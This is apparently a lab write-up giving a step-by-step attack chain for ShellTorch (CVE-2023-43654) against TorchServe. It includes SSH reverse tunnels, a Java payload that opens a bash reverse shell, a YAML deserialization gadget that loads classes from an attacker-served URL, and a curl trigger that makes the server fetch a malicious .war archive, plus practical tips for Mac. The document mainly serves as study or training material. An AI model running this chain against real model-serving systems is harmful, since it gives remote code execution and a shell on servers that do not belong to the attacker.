# Model Deployment Tampering (ShellTorch)

TorchServe SSRF (CVE-2023-43654) triggers YAML deserialization to execute arbitrary Java code.

## Attack Chain

1. SSH tunnel: ssh TARGET -R 8000:127.0.0.1:8000 -R 1337:127.0.0.1:1337 -L 8081:127.0.0.1:8081
2. Java payload in MyScriptEngineFactory constructor: bash reverse shell to 127.0.0.1:1337
3. spec.yaml: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1:8000/"]]]]
4. Package with torch-workflow-archiver
5. Trigger: curl -X POST "http://127.0.0.1:8081/workflows?url=http://127.0.0.1:8000/student.war"

## Mac Notes

- brew install openjdk@17
- Use Python socket listener instead of ncat
- Use new workflow names for each attempt (server caches .war files)
